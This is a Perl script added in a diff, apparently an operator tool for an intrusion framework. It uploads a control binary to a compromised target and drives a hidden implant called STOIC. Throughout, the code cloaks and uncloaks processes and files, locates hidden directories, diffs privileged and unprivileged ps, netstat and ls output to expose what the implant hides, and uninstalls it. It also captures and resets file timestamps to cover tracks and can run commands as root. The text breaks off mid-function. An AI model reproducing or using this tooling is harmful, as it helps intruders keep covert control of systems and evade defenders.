@@ -1,0 +1,1570 @@
+#!/usr/bin/env perl 
+##
+$VER="1.2.0.23";
+
+# This can be called either via its gs.auto* script or via a require
+# statement in another auto* script already in play. That script must
+# set @ARGV and already have the $socket open to a NOPEN client's autoport.
+# 
+# NOTE THOUGH:  After one require (say of this script), another one of another
+#               similarly equipped script really confuses things...local data
+#               is not so local.
+
+$| = 1 ;
+#my $runctrl = "-ctrl";
+(@setpastables,$doinguninstall)  =  ();
+my (@pids,                    # pids targetd by Ctrl commands
+    @paths,                   # paths targetd by Ctrl commands
+    @timeargs,                # Times for -ctrl -s, moved here from @pids
+    @doopts,                  # Ctrl options being executed
+    $warnings,                # Set if any Ctrl sets an error code
+    $seed,                    # Set via -S or $nopen_hostonly
+    $seedset,                 # Seed already in -getenv if there
+    @env,                     # Target -getenv returned by nopenaddpath()
+    $path,                    # Target PATH
+    @finalout,                # Shown last, errors and such
+    $hiddensensitive,         # Set when we must avoid hidden dir
+    $logsleeptime,            # Seconds to disable logging with -L SECS
+#    $startpath,               # Path other than / in which to look for hidden
+   ) = ();
+
+$startpath = "";              # Path other than / in which to look for hidden
+
+# These are not "my", instead globals so do $file works with them
+(
+    $ctrlltr,                 #   Letter of Ctrl on target (./.$ctrlltr)
+    %ctrluploaded,            #   key=remote name in (rel. to ./)
+                              #   value=local file
+    $ctrluploaded,            #   Full path to remote Ctrl if up there
+) = ("b");
+# These two globals cleared by autoutils also
+($completeoutput,@completeoutput) = () unless defined @completeoutput;
+my ($pstoicls,$pnopenlines,@pstoicls,
+    $Pstoicls,$Pnopenlines,@Pstoicls,
+    $partialls,$nopenlines,@partialls,
+    @hiddenls,
+   ) = ();
+
+
+$hiddenchanged = 0;
+myinit() ;
+
+$originalhiddendir = $host_hiddendir;
+$hiddendirprompt = $originalhiddendir;
+
+#mydie("
+#workingdir=$workingdir=
+#nhome=$nhome=
+#host_hiddendir=$host_hiddendir=
+#targetcwd=$targetcwd=
+
+#")
+#	  if ($host_hiddendir and
+#	      $targetcwd =~ /$host_hiddendir/
+#	     );
+
+
+
+#  my ($hiddendir,$safehiddendir,@output) =
+#    gethiddendir(1,0,\@hiddendirs,\@safehiddendirs);
+
+my @hiddendirs = ();
+my @safehiddendirs = ();
+my @tmpdirs = keys %host_hiddendirs;
+my $hiddenbasesregexp = "@tmpdirs";
+dbg("hiddenbasesregexp=$hiddenbasesregexp=");
+if (@tmpdirs > 1) {
+  $hiddenbasesregexp = "(@tmpdirs)";
+  $hiddenbasesregexp =~ s, ,\|,g;
+}
+
+if ($noupload) {
+  $hiddendirprompt .= "SPECIAL: This is odd.";
+  if ($lsdiropt) {
+    if ($recursediropt or !$redodirtest) {
+      my ($hdir,$shdir,@lsoutput) =
+	gethiddendir($redodirtest,$recursediropt,\@hiddendirs,\@safehiddendirs,undef,$startpath);
+      dbg("gethiddendir with recursediropt on returned ($hdir,$shdir,@lsoutput)
+
+with hiddendirs=(\n".
+	  join("\n",@hiddendirs)."\n)\n\n and safehiddendirs=(\n".
+	  join("\n",@safehiddendirs)."\n)
+
+");
+      if (!$hdir) {
+	# We have to clear the %host_hiddendirs (by clearing all $host_hiddendirs{})
+	# var if $oldhost_workingdirwashiddendir
+	#      newhostvar("host_hiddendir","CLEARALLMATCHING");
+	# We have to clear the workingdir var if $oldhost_workingdirwashiddendir
+	newhostvar("host_workingdir","CLEARALLMATCHING")
+	  if $oldhost_workingdirwashiddendir;
+      }
+      # If @lsoutput is empty, no ls was just done, tell the user
+      if ($hdir and !@lsoutput and !$recursediropt) {
+	my $plural = "y is";
+	$plural = "ies are" if (@hiddendirs > 1);
+	progprint(".\n\nHidden director$plural:\n\n  ".
+		  $COLOR_FAILURE.
+		  join("\n  ",@hiddendirs).$COLOR_NORMAL.
+		  "\n\n(Use -R to find anew on target.)"
+		 );
+      }
+    }
+#    if ($recursediropt) {
+#        doit("-ls -R $host_hiddendirlist");
+#        #progprint("Hidden directories recursively listed above.");
+#    }
+  } elsif ($findstoic) {
+    ($Pstoicls,$nopenlines,@Pstoicls) =    findstoicfiles();
+  }
+} else {
+  # New check, if we are both currently elevated and about
+  # to run -ctrl -U or -n, offer to run -k on us first
+  my $pidhit = "@doopts @pids" =~ /k.* $targetpid/;
+  my $ppidhit = "@doopts @pids" =~ /k.* $targetppid/;
+dbg("pidhit=$pidhit ppidhit=$ppidhit (@doopts @pids)");
+  $ppidhit = 1 if $targetppid == 1;
+  if ("@doopts" =~ /[nU]/ and $prog =~ /stoicctrl/) {
+   # WAS: and  !($pidhit and $ppidhit)) {
+#offerabort("not in noupload block startpath=$startpath=");
+    ($host_hiddendir,$safehiddendir,@output) =
+      gethiddendir(force,$recursediropt,\@hiddendirs,\@safehiddendirs,undef,$startpath);
+dbg("after force 1 hiddenbase=$hiddenbase= hiddendir=$host_hiddendir=");
+    $doinguninstall = 1;
+    if ($host_hiddendir) {
+      my $s="";
+      my $pidlist = "$targetpid";
+      if ($targetppid and $targetppid > 1) {
+	$s = "s";
+	$pidlist .= " $targetppid";
+      }
+      my @pidstosave = (split(/ /,$pidlist),@pids);
+      my ($ans,$longans) = mygetinput
+	("You are about to uninstall STOIC and it appears you are elevated.\n\n".
+	 "Which do you want to do?\n\n".
+	 "      k) run -ctrl -k on your pid$s first ($pidlist) so they are\n".
+	 "         preserved (not killed) after the uninstall;\n\n".
+         "  k # #) Optionally, add other PIDs to use -ctrl -k on\n\n".
+	 "      A) ABORT here; or\n\n".
+	 "      C) CONTINUE if you know you should continue as is.\n\n".
+	 "Which? (k,A,C)","k","A","C","ABORT","CONTINUE");
+      mydie("User aborted") if $ans eq "a";
+      if ($ans eq "k") {
+	my ($morepids) = $longans =~ /([\d ]+)/;
+	push (@pidstosave,split(/\s+/,$morepids)) if $morepids;
+	#      dbg("pidstosave=(@pidstosave");
+	@pidstosave = uniqify_array(@pidstosave);
+	my @newopts = ("k");
+	putctrl();
+	doctrl(\@newopts,@pidstosave);
+	
+	offerabort
+	  ("This could be bad. The -ctrl -k seems to have failed.")
+	    if @errs;
+	doit("-cd /tmp")
+	  if ($host_hiddendir and
+	      $targetcwd =~ /$host_hiddendir/ and
+	      $doinguninstall);
+      }
+    }
+  }
+  # If we are doing $dostoicdiff, we set this so we only put up once
+  $reusestoic=1 if $dostoicdiff and !$reusestoic;
+#  if (!$redodirtest and "@doopts" eq "d" and $host_hiddendir and $host_hiddendir_viastoic) {
+#    mystoicmydie($COLOR_NORMAL.
+#		 "\n\nHidden directory was previously determined to be:\n\n  ".
+#		 $COLOR_FAILURE.
+#		 $host_hiddendir.$COLOR_NORMAL.
+#		 "\n\n(Use -R to find it anew1 on target.)"
+#		);
+#  }
+
+  mydoit("-setenv SEED=$seed")
+    unless ($seedset eq $seed);
+  if ($uninstalloptscount) {
+    $hiddendirprompt .= "SPECIAL: \n\nThis is normal after uninstall.";
+  } elsif ($disableoptscount) {
+    $hiddendirprompt .= "SPECIAL: \n\nThis is normal after using -ctrl -".
+      join(" -",@doopts)." to disable @pids."
+  } elsif ($enableoptscount) {
+    $hiddendirprompt .= "SPECIAL: \n\nThis is normal after using -ctrl -".
+      join(" -",@doopts)." to enable @pids."
+  }
+  putctrl() unless $dostoicdiff;
+
+  if ($logsleeptime) {
+      doctrl(\@doopts,$logsleeptime);
+  } elsif (@pids or @paths or $signal) {
+    my ($oldtimes,$oldnopen,@oldtimes) =
+      doctrl(\@doopts,@pids,@paths,$signal);
+    my ($this,$s,$n) = ("this");
+    if (@paths > 1) {
+      $this = "these";
+      $s = "s";
+      $n = "\n";
+    }
+#    # Use this to re-set hiddendir related hostvars after just using Ctrl
+#    dbg("before force 0 hiddenbase=$hiddenbase= hiddendir=$host_hiddendir=");
+#    ($host_hiddendir,$safehiddendir,@output) =
+#      gethiddendir(force,$hiddendirprompt,\@hiddendirs,\@safehiddendirs);
+    dbg("after force 0 hiddenbase=$hiddenbase= hiddendir=$host_hiddendir=");
+    if (($doopts[0] eq "s" or $doopts[0] eq "-s")
+	and @paths) {
+#      dbg("AGAIN:
+#pids=(@pids)
+#paths=(@paths)
+#signal=$signal
+#doopts=(@doopts)
+#nulloptscount=$nulloptscount
+#");
+      preservefile(my $tmpfile = "$optmp/lss.stoicctrl.$nopen_rhostname.$ext");
+      nopenlss("-Ud",
+	       "-Qd$lsopt",
+	       "-O$tmpfile",
+		 @paths);
+      my ($listing,@timesin) = ();
+      if (open(STOICIN,$tmpfile)) {
+	@timesin = <STOICIN>;
+#	dbg("tmpfile contains:\n".join("\n",@timesin).	    "EOFFFFF\n\n\n");
+      } else {
+	mydie("autostoicctrl cannot write to $tmpfile");
+      }
+      close(STOICIN);
+      my $gotit = 0;
+      foreach (@timesin) {
+	next unless $gotit or /mtime.*atime.*ctime.*filename/;
+	$gotit++;
+	my ($stuff,$mtime,$atime,$ctime,$garbage,$filename) =
+	    /(.*) \| (.*) \| (.*) \| (.*) \|(.* \d\d:\d\d \d\d\d\d) (.*)\s+$/;
+	$stuff =~ s/\s*\d+\s*//;
+	chomp($filename);
+	if (length $stuff and length $filename)  {
+	  $listing .= sprintf
+	    ("%-54s %5s %17s\n".
+	     "%-54s %5s %17s\n".
+	         "%60s %17s\n\n".
+	     "",
+	     $filename,"mtime",$mtime,
+	     $stuff,"atime",$atime,
+	     "ctime",$ctime,
+	    );
+	}
+	last if /^NO\!/;
+      }
+      progprint("$COLOR_NORMAL\n\nm-a-c times follow: \n".
+		$listing);
+    }
+  } elsif ($dostoicdiff) {
+    # Special subcase of $nulloptltrs, must come before 
+    # check below for $nulloptscount
+    dbg("hiddenbase=$hiddenbase= hiddendir=$host_hiddendir=");
+    my $hiddenbase = basename($host_hiddendir) if $host_hiddendir;
+    # If Ctrl is there already and in hiddendir remove it
+    if ($hiddenbase and
+	$ctrluploaded and
+	$ctrluploaded =~ /$hiddenbasesregexp/) {
+      rmctrl(force);
+#      mydoit("rm $ctrluploaded");
+#      newhostvar(ctrluploaded,"");
+#      unlink "$optmp/stoicuploaded.$nopen_rhostname";
+      $putdest = "/tmp";
+      $putdest = $host_nonhiddenworkingdir
+	if $host_nonhiddenworkingdir;
+      putctrl();
+      myalert("Forcing workingdir of /tmp with -ctrl -H");
+      sleep 2;
+    }
+    $path = removefrompath($path,@host_hiddendirs);
+    unless ($host_hiddendir) {
+      my ($ans) = mygetinput
+	("It does not appear you are currently elevated, if you continue your comparison\n".
+	 "of =ps with -p and -P mode and it DOES show HIDDEN processes, you may not\n".
+	 "be fully priveleged (that is, the -p may work for your pid, but you cannot\n".
+	 "currently see the hidden directory. If however it shows no hidden PID, it may\n".
+	 "confirm no STOIC is present.".
+	 "\n\n<C>ontinue or <A>bort.",
+	 "CONTINUE","ABORT","C","A"
+	);
+      mystoicmydie("User aborted") if $ans eq "a";
+    }
+    putctrl();
+    unlink("$opdown/ctrl-H.ps.$nopen_rhostname.elevated",
+	   "$opdown/ctrl-H.ps.$nopen_rhostname.notelevated",
+	   "$opdown/ctrl-H.netstat.$nopen_rhostname.elevated",
+	   "$opdown/ctrl-H.netstat.$nopen_rhostname.notelevated");
+    my @tmpopts = ("c");
+    doctrl(\@tmpopts,$targetppid) if ($targetppid > 1);
+    my @tmpopts = ("c","p","f");
+    doctrl(\@tmpopts,$targetpid);
+    mystoicmydie("Cannot continue with $prog -H: Ctrl -cpf $targetpid failed on target\n".
+		 "(likely no STOIC there)")
+      if @errs;
+    if ($dols) {
+      ($pstoicls,$nopenlines,@pstoicls) = findstoicfiles();
+    }
+    if ($dops) {
+      print STOICOUT "\n# ". timestamp(). " $pstodo NOT ELEVATED:\n"
+	if (open(STOICOUT,">> $opdown/ctrl-H.ps.$nopen_rhostname.elevated"));
+      close(STOICOUT);
+      mydoit("$pstodo >> T:$opdown/ctrl-H.ps.$nopen_rhostname.notelevated");
+    }
+    if ($donetstat) {
+      print STOICOUT "\n# ". timestamp(). " $netstattodo$extranetstatops NOT ELEVATED:\n"
+	if (open(STOICOUT,">> $opdown/ctrl-H.netstat.$nopen_rhostname.elevated"));
+      close(STOICOUT);
+      mydoit("$netstattodo$extranetstatops >> T:$opdown/ctrl-H.netstat.$nopen_rhostname.notelevated");
+    }
+    @tmpopts = ("C","P","F");
+    doctrl(\@tmpopts,$targetpid);
+    @tmpopts = ("C");
+    doctrl(\@tmpopts,$targetppid) if ($targetppid > 1);
+    rmctrl(force) unless ($noupload or $reusestoic > 1);
+    mystoicmydie("Cannot continue with $prog -H: Ctrl -PF $targetpid failed on target\n".
+		 "(likely no STOIC there but$COLOR_WARNING why$COLOR_FAILURE did first one work?)")
+      if @errs;
+    if ($dols) {
+      ($Pstoicls,$nopenlines,@Pstoicls) =    findstoicfiles();
+    }
+    if ($dops) {
+      print STOICOUT "\n# ". timestamp(). " $pstodo ELEVATED:\n"
+	if (open(STOICOUT,">> $opdown/ctrl-H.ps.$nopen_rhostname.elevated"));
+      close(STOICOUT);
+      mydoit("$pstodo >> T:$opdown/ctrl-H.ps.$nopen_rhostname.elevated");
+    }
+    if ($donetstat) {
+      print STOICOUT "\# ". timestamp(). " $netstattodo$extranetstatops ELEVATED:\n"
+	if (open(STOICOUT,">> $opdown/ctrl-H.netstat.$nopen_rhostname.elevated"));
+      close(STOICOUT);
+      mydoit("$netstattodo$extranetstatops >> T:$opdown/ctrl-H.netstat.$nopen_rhostname.elevated");
+    }
+    my $sleepmore = 	      "Differences follow in 3 seconds...\a."
+      unless $nosleep;
+    progprint($COLOR_NORMAL."\n\n".
+	      "Both priveleged and non-priveleged command$dowhichplural ($dowhich) $dowhichverb done.\n\n".
+	      $sleepmore);
+    sleep 3 unless $nosleep;
+#    progprint("","pause2");
+    my $stoicdiffcontent = "";
+#      mydoit("-lsh diff -b $opdown/ctrl-H.$nopen_rhostname.notelevated $opdown/ctrl-H.$nopen_rhostname.elevated | sed \"s/^>/HIDDEN?>/g\" | sed \"s/^</inboth?</g\" | egrep -v \"^[0-9]|^---|NOT ELEVATED\" | sed \"s/HIDDEN..\\\\(.*ELEVATED\\\\)/ . . . .\\\\1/g\" | sed \"s/inboth..\\\\(.*ELEVATED\\\\)/ . . . .\\\\1/g\"");
+    if ($donetstat) {
+      $stoicdiffcontent .=
+	"$COLOR_NORMAL\n\nThese network connections from $netstattodo are being hidden by STOIC (except\n".
+	"this window\'s session is not shown, it was briefly visible if STOIC is there):\n".
+        "$COLOR_FAILURE\n";
+      my $new = `diff -b $opdown/ctrl-H.netstat.$nopen_rhostname.notelevated $opdown/ctrl-H.netstat.$nopen_rhostname.elevated | sed "s/^>/HIDDEN?>/g" | sed "s/^</inboth?</g" | egrep -v "^[0-9]|^---" | grep -v " ELEVATED"`;
+      $stoicdiffcontent .= $new;
+    }
+    if ($dops) {
+      $stoicdiffcontent .=
+	"$COLOR_NORMAL\n\nThese processes (except for $pstodo) are being hidden by STOIC:\n$COLOR_FAILURE\n";
+      my ($pscount,%pspids,%pidlines) = ();
+      my $content = `diff -b $opdown/ctrl-H.ps.$nopen_rhostname.notelevated $opdown/ctrl-H.ps.$nopen_rhostname.elevated | sed "s/^>/HIDDEN?>/g" | sed "s/^</inboth?</g" | egrep -v "^[0-9]|^---|NOT ELEVATED" | sed "s/HIDDEN..\(.*ELEVATED\)/ . . . .\1/g" | sed "s/inboth..\(.*ELEVATED\)/ . . . .\1/g" ; grep "ps "  $opdown/ctrl-H.ps.$nopen_rhostname.notelevated | sed "s/^/-PRIVps< /g"`;
+      foreach (split(/\n/,$content)) {
+	$_ .= "\n";
+	my ($pid) = /(\d+)/;
+	next if /^(HIDDEN|inboth)\?>\s*$/;
+	if (/^(HIDDEN|inboth).*ELEV/) {
+	  s/.*\#/\#/;
+	  $stoicdiffcontent .= $_;
+	  next;
+	}
+	if ($pidlines{$pid}) {
+	  # Second line, same pid? Remove first then
+	  $stoicdiffcontent =~ s,$_,,;
+	  next;
+	} elsif (/^inboth.*( |\/)ps /) {
+	  next if $pspids{$pid}++;
+	  $pscount++;
+	  s/^inboth./$COLOR_NOTE-PRIVps/;
+	  s/$/$COLOR_FAILURE/;
+	} elsif (/^HIDDEN.*( |\/)ps /) {
+	  next if $pspids{$pid}++;
+	  $pscount++;
+	  s/^HIDDEN./$COLOR_NOTE+PRIVps/;
+	  s/$/$COLOR_FAILURE/;
+	} elsif (/( |\/)ps /) {
+	  $pscount++;
+	  s/^/$COLOR_NOTE/;
+	  s/$/$COLOR_FAILURE/;
+	}
+	$pidlines{$pid} .= $_;
+	$stoicdiffcontent .= $_;
+      }
+      if ($pscount > 2) {
+	$stoicdiffcontent .=
+	  "\n".
+	  ("=" x 80)."\n".
+          "\nTHIS MAY BE VERY BAD!!!  We saw more than just our two ps commands.\n\n\n".
+	  "SO SOMEONE COULD HAVE SEEN OURS!!\n\n".
+	  "See BLUE lines above.\n".
+	  ("=" x 80)."\n\n";
+      }
+    }
+    my $regexp = "";
+    if ($dols) {
+      # We build @hiddenls as all files shown in @Pstoicls but not @pstoicls
+      foreach my $Pline (@Pstoicls) {
+	my $visible = 0;
+	foreach my $pline (@pstoicls) {
+	  $visible = 1 if $pline eq $Pline;
+	  last if $visible;
+	}
+	push(@hiddenls,$Pline) unless $visible;
+      }
+      if (@hiddenls) {
+	$stoicdiffcontent .=
+	  "$COLOR_FAILURE\nThese files are being hidden by STOIC:\n\n".
+	    $COLOR_NORMAL.
+	      join("\n",@hiddenls);
+      } else {
+	$stoicdiffcontent .=
+	  "$COLOR_FAILURE\nNO FILES$COLOR_NORMAL are being hidden by STOIC.";
+      }
+    }
+    progprint($stoicdiffcontent);
+  } elsif ($nulloptscount) {
+    doctrl(\@doopts," ");
+  } else {
+    mystoicmydie("We have doopts=(@doopts)");
+  }
+}
+rmctrl() unless $noupload;
+
+if ($outputfile and open(STOICOUT,">$outputfile")) {
+#  print STOICOUT "TESTING: COMPLETEOUTPUT\n===============\n$completeoutput\n================\n";
+#  print STOICOUT "TESTING: \@COMPLETEOUTPUT\n===============\n";
+  print STOICOUT join("\n",@completeoutput)."\n";
+  close(STOICOUT);
+}
+
+@errs = grep /^1$/,@completeoutput;
+@nonerrs = grep /^0$/,@completeoutput;
+my ($running) = ();
+foreach (@completeoutput) {
+  if (/RUNNING/) {
+    $running = $_ ;
+  } else {
+    $results{$running} .= $_ if $running;
+  }
+}
+$running = "";
+foreach my $key (keys %results) {
+  $running .= "$key: $results{$key}\n";
+}
+#dbg("completeoutput=(\n".
+#    join("\n",@completeoutput)."\n)\n".
+#    "exiting autostoicctrl with errs=(@errs) results=(".
+#    $running.
+#    ")");
+
+if (@setpastables) {
+  my $s = "";
+  $s = "s" if (@setpastables > 1);
+  my $destfile = "$optmp/ctrl-s.$nopen_rhostname.pastables";
+  my $ext = "00000";
+  while (-e "$destfile.$ext") {
+    $ext = int($ext+1);
+    $ext = sprintf("%05d",$ext);
+  }
+  $destfile .= ".$ext";
+  @setpastables = sort by_path_depth_with_times @setpastables;
+  $setpastables[$#setpastables] =~ s,-As,-s,;
+  my $setpastables2 = join("\n",@setpastables);
+  my $fileoutput = "#NOGS\n".
+    "# Times retrieved from $nopen_rhostname at ".gmtime()." -nohist \n-nohist ".
+    join("\n-nohist ",@setpastables)."\n";
+  print CTRLOUT $fileoutput if (open(CTRLOUT,">$destfile"));
+  close(CTRLOUT);
+  progprint(".\n$COLOR_FAILURE\n".
+	    "Pastable$s to re-set time$s just retrieved:\n$COLOR_NORMAL\n".
+	    "$setpastables2\n\n".
+	    "These are alvailable, en masse, and in the proper order (deepest first),\n".
+	    "by running the following --$COLOR_FAILURE BE SURE TO DO SO ON THE RIGHT HOST:".
+	    "$COLOR_NORMAL\n\n".
+	    "              -gs $destfile");
+}
+# Use this to re-set hiddendir related hostvars after just using Ctrl
+dbg("At end of stoicctrl (via $prog) hiddenbase=$hiddenbase= hiddendir=$host_hiddendir=
+
+hiddendirprompt=$hiddendirprompt=
+enableoptscount=$enableoptscount=
+disableoptscount=$disableoptscount=
+uninstalloptscount=$uninstalloptscount=
+ABOUT TO:
+  if ($disableoptscount or
+      $enableoptscount or
+      $uninstalloptscount or
+      $host_hiddendir ne $originalhiddendir
+     );
+
+WTF?
+
+    (!$originalhiddendir or $host_hiddendir))
+hiddenchanged=$hiddenchanged=
+
+
+errs=(@errs) nonerrs=(@nonerrs) inside autostoicctrl
+");
+
+dbg("WTF? again") if
+    ($prog =~ /stoicctrl/ and
+     $lsdiropt and $redodirtest and !$recursediropt and
+     ($originalhiddendir or $host_hiddendir));
+
+if ($disableoptscount or
+    $enableoptscount or
+    $uninstalloptscount or
+    # If this is -ctrl -L, we do the gethiddendir() call here unless
+    # recursing
+    # or unless there was not (in autoutils) and still is not a hidden dir, in which case
+    # the gethiddendir() call that autoutils does is sufficient.
+    ($prog =~ /stoicctrl/ and
+     $lsdiropt and $redodirtest and
+     !$recursediropt and
+     (!$hiddenchanged and ($host_hiddendir or $originalhiddendir)))) {
+#     ($originalhiddendir or $host_hiddendir))
+#   ) {
+  ($host_hiddendir,$safehiddendir,@output) =
+    gethiddendir(force,$hiddendirprompt,\@hiddendirs,\@safehiddendirs);
+}
+if ($lsdiropt and $redodirtest and !$recursediropt and
+    $prog =~ /stoicctrl/ and
+    !($originalhiddendir or $host_hiddendir)) {
+  mywarn("No hidden dirs found");
+}
+
+
+if (!$host_hiddendir and $host_workingdir =~ /[a-f0-9]{16}$/i) {
+  progprint("CLEAERING host-wide variable host_workingdir from:\n".
+	    "  $host_workingdir\n\n".
+	    "(looks like a hidden dir and we do not have one)",
+	    $COLOR_FAILURE);
+  newhostvar("host_workingdir","CLEARALLMATCHING");
+}
+
+if (@finalout) {
+  progprint($COLOR_FAILURE."\n\n".join("\n",@finalout)."\n\n".
+	   "Return values of 1 indicate failure.");
+}
+
+# Called via do so must end with 1;
+1;
+
+sub myinit {
+  # If $willautoport is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $calledviarequire = 0 unless $calledviarequire;
+  $stoiccmd = "called as: -gs stoicctrl @ARGV";
+  if ($willautoport and $socket) {
+    $stoiccmd = "in $prog, called as: stoicctrl(@ARGV)";
+    dbg("via require autostoicctrl ARGV=(
+".join("\n",@ARGV)."
+) prog=$prog");
+#    progprint("$prog called -gs stoicctrl @ARGV");
+    $calledviarequire = 1;
+  } else {
+    $prog = "-gs stoicctrl";
+    $willautoport=1;
+    my $autoutils = "../etc/autoutils" ;
+    unless (-e $autoutils) {
+      $autoutils = "/current/etc/autoutils" ;
+    }
+    require $autoutils;
+    $vertext = "$prog version $VER\n" ;
+  }
+  clearallopts();
+  $vertext = "$prog version $VER\n" ;
+  mystoicmydie("No user servicable parts inside.\n".
+	"(I.e., noclient calls $prog, not you.)\n".
+	"$vertext") unless ($nopen_rhostname and $nopen_mylog and
+			    -e $nopen_mylog);
+
+  $extranetstatops = "";
+  $extranetstatops = "p" if $linuxtarget;
+  setusagetexts();
+  usage() unless @ARGV;
+  my $origoptions = "@ARGV";
+  mystoicmydie("bad option(s)") if (! Getopts( "o:Dhvw:XS:dCcdsgEeFfPpKkrTUnN:zHWARlbi:aL:" ) ) ;
+  $pauseafterupload = $opt_b;
+  @completeoutput = () if ($clearprevious = $opt_z);
+  $stoickillopt = 1 if ($opt_k or $opt_K);
+  $reusestoic = 2 if $opt_A;
+#  if (-s "$optmp/stoicuploaded.$nopen_rhostname") {
+#    dbg("BEFORE: \$ctrluploaded=$ctrluploaded= ctrlltr=$ctrlltr=");
+#    do "$optmp/stoicuploaded.$nopen_rhostname";
+#    dbg(" AFTER: \$ctrluploaded=$ctrluploaded= ctrlltr=$ctrlltr=");
+#  }
+
+  if ($opt_i) {
+    @inputlist = readpathsfromfile($opt_i,NODIE);
+    mydie("-i $opt_i must be a local file containing a listing with paths in it")
+      unless @inputlist;
+  }
+  $newstoicfile = $opt_N;
+  $dostoicdiff = $opt_H;
+  ($dops,$donetstat,$dols,$dowhich,
+   $dowhichverb,$dowhichplural,
+   $pstodo,$netstattodo)
+    = (1,1,1,"=ps, -ls, netstat -an",
+       "are","s",
+       "=ps","netstat -an");
+  if ($dostoicdiff) {
+    if (@ARGV) {
+      ($dops,$donetstat,$dols,$dowhich) = ();
+      my @new = ();
+      foreach (@ARGV) {
+	if ($_ eq "nosleep") {
+	  $nosleep++;
+	} elsif ($_ eq "ps" or
+	    /ps_/) {
+	  if (/_/) {
+	    s,_, ,g;
+	    $pstodo = $_;
+	  }
+	  $dops=1;
+	  $dowhich .= "$pstodo, " unless ($dowhich =~ /$pstodo, /);
+	} elsif (/netstat/) {
+	  if (/_/) {
+	    s,_, ,g;
+	    $extranetstatopts = "";
+	    $netstattodo = $_;
+	    dbg("netstat is now \"$netstattodo\"");
+	  }
+	  $donetstat=1;
+	  $dowhich .= "$netstattodo, " unless ($dowhich =~ /netstat/);
+	} elsif ($_ eq "ls" or $_ eq "-ls") {
+	  $dols=1;
+	  $dowhich .= "-ls, " unless ($dowhich =~ /ls,/);
+	} else {
+	  push(@new,$_);
+	}
+      }
+      $dowhich =~ s/, $//;
+      if ($donetstat + $dops + $dols > 1) {
+	($dowhichverb,$dowhichplural)
+	  = ("are","s");
+      } elsif ($donetstat + $dops + $dols == 1) {
+	($dowhichverb,$dowhichplural)
+	  = ("is","");
+      } else {
+	# False alarm, we saw no ps/netstat/ls so reset all
+	($dops,$donetstat,$dols,$dowhich,
+	 $dowhichverb,$dowhichplural,
+	 $pstodo,$netstattodo)
+	  = (1,1,1,"=ps, -ls, netstat -an",
+	     "are","s",
+	     "=ps","netstat -an");
+      }
+      @ARGV = @new;
+    }
+  }
+  if ($newstoicfile) {
+    mydie("-N $newstoicfile must exist somewhere in $opup")
+      unless ($newstoicfile =~ m,^$opup, and -e $newstoicfile);
+  }
+  # -L is now polymorphic--we undef it here if it is the Ctrl -L SECS option
+  if ($opt_L) {
+    if ($opt_L =~ /^\d+$/) {
+      mydie("-ctrl -L $opt_L is only valid on Solaris")
+	unless $solaristarget;
+      @doopts = ("L");
+      $logsleeptime = int($opt_L);
+      undef $opt_L;
+    } elsif ($opt_L =~ /^R/) {
+      $opt_R++;
+      ($startpath) = $opt_L =~ /^R(\/.*)/,;
+    } elsif ($opt_L !~ /^N/) {
+      mydie("Invalid option: -L $opt_L");
+    }
+  }
+  $redodirtest = $opt_R;
+  $lsdiropt = 1 if ($opt_L or $opt_l);
+  $recursediropt = $opt_l;
+  $findstoic = $opt_W;
+  $noupload = 1 if ($lsdiropt or $findstoic);
+  if ($outputfile = $opt_o) {
+    if ($outputfile =~ m,/,) {
+      unless ($outputfile =~ m,/.*/,) {
+	mystoicmydie("Do not put your output file in /: $outputfile");
+      }
+    }
+    unless ($outputfile =~ m,/,) {
+      $outputfile = "$optmp/$outputfile";
+    } else {
+      my $dir = dirname($outputfile);
+      mydie("-o $outputfile uses a directory ($dir) that does not yet exist")
+	unless -d $dir;
+    }
+    preservefile($outputfile);
+  }
+
+
+  ###########################################################################
+  # PROCESS ARGUMENTS
+  ###########################################################################
+
+  ## DEFAULTS
+  $putdest = "/tmp" unless (defined $putdest and $putdest =~ m,^/,);
+
+  # Counters. Note we call -C "enable" and -c "disable", rather than cloak/uncloak.
+  # Lowercase are like normal user, uppercase is us.
+  # 20120922: NOTE, k was in $disableoptltrs, why was that?
+  ($enableoptltrs,              $disableoptltrs,    $uninstalloptltrs, $localoptltrs,
+   $alloptltrs,                 $pidoptltrs,        $pathoptltrs,      $nulloptltrs,) =
+     ("CEFPK",                  "cefp",            "Un",              "a",
+      "LCcdsgEeFfPpKkrTUunHWla","CcEeFfPpKk",       "Ccsgr",           "LdUunHWl",);
+
+  ($enableoptscount,          $disableoptscount,  $uninstalloptscount,
+   $alloptscount,             $pidoptscount,      $pathoptscount,  $nulloptscount,) =
+     (0,0,0,0,0,0);
+
+  # This must only get populated for -s commands,
+  # it is used in every call to doctrl().
+  $extraargs="";
+
+  # $debug not really used, may want it later
+  $debug = $opt_D ;
+
+  # Group @ARGV args indo categories with greps
+  @pids       = grep /^\d+$/ , @ARGV;
+  @paths      = grep m,^/, , @ARGV;
+  push(@paths,@inputlist) if @inputlist;
+  my @zeros   = grep /^0+$/ , @ARGV;
+  my @ones    = grep /^1$/ , @ARGV;
+  my @therest = grep ! m,^(\d+|/.*)$, , @ARGV;
+dbg("therest=(@therest)
+
+") if (@therest);
+
+  usage() if ($opt_h or $opt_v) ;
+
+  mydie("-H is not usable with any PIDs or PATHs")
+    if ($dostoicdiff and ($opt_r or
+		       @paths or @pids));
+
+  # Connect to autoport, we need status and more interactively.
+  # If $socket is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $socket = pilotstart(quiet) unless $socket;
+
+  # Get some remote status information, need $targetcwd and maybe pids.
+  ($clientver,$histfile,$cmdoutfile,$localcwd,$nhome,$localpid,$localppid,
+   $serverver,$targetwdir,$targetos,$targetcwd,$targetpid,$targetppid,$targetport)
+    =  parsestatus(force) unless $noupload;
+
+  # Must do -r first, one use of it really means -C and -E both
+  if ($opt_r) {
+    if ( !@therest and !@paths) {
+      offerabort("Assuming you mean the NOPEN usage for -r, not the upload/execute\n".
+		 "\"Ctrl -r PATH\" which runs something as root (and is rarely used).");
+      $opt_C++;
+      $opt_E++;
+      undef $opt_r;
+    } else {
+      my $s="s" if @paths > 1;
+      my $more = "";
+      if (!@paths) {
+	@paths = ("@therest");
+	@therest=();
+      }
+      foreach (@paths) {
+	$more .= "\t$_ @therest\n";
+      }
+      $extraargs = "@therest";
+      @therest = ();
+      offerabort
+	("Command$s: \n".
+	 "$more\n".
+	 "Are you sure you want to run the above command$s as root?\n".
+	 "This option is hardly ever used.");
+    }
+  }
+
+  for (my $i=0;$i<length($alloptltrs);$i++) {
+    my $ltr = substr($alloptltrs,$i,1);
+    if (eval "\$opt_$ltr") {
